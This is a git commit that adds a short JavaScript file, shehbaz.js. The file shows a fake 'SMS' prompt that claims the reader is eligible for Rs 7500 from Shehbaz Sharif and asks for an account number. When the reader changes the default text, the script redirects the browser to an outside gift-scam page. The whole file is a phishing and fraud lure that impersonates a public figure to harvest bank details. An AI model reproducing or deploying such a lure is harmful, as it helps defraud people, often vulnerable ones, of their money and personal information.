81144cdf6649a78c45bf13ff5cf283409c8548ab
usorondo75 <renown-stroll1x@icloud.com>
2026-06-07 15:29:24 +0100

    Create shehbaz.js

---
+++ shehbaz.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW Rs,7500'
+password=prompt('SMS: Congratulations, you are eligible to receive Rs,7500 From Shehbaz Sharif, click OK to Enter Your Acc. Number','WITHDRAW Rs,7500');
+if (password != 'WITHDRAW Rs,7500') {
+location.href='https://www.selectzboi.site/shehbaz-rs7500-gift';
+}
